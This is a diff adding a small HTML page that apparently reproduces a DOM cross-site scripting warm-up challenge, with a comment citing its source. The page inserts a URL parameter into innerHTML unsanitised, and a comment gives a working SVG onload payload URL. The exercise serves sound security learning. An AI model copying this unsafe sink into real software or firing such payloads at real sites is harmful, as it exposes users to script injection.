@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS
+    </title>
+</head>
+<body>
+    <h2 id="xss"></h2>
+    <script>
+        xss.innerHTML = "Hello " + (new URL(location).searchParams.get('somebody') || "Somebody")
+    </script>
+</body>
+</html>
+
+<!-- http://localhost:5173/xss.html?somebody=%3Csvg%20onload=alert(1337)%3E -->
+<!-- src: https://xss.pwnfunction.com/warmups/ma-spaghet/ -->
